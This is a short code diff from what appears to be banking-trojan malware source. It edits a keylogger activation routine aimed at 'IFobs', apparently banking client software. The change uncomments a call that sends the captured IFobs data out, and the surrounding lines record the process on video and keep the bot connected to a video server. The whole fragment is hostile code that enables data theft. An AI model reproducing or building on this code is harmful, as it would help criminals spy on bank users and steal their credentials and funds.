@@ -546,7 +546,7 @@ void Activeted1(LPVOID Sender)
 	DBG( "IFobs", "Activated1" );
 	PKeyLogSystem System = (PKeyLogSystem)Sender;
 //	if( !Bot->FileExists( 0, GetStr(IFobsFlagCopy).t_str() ) )
-//		MegaJump(SendIFobs);
+		MegaJump(SendIFobs);
 	VideoProcess::RecordPID( 0, "IFobs" );
 	VideoProcess::UpdateSettings( 0, 0, 0, 24 * 60 ); //бот не должен отключаться от видео сервера
 	typeActive = 1;
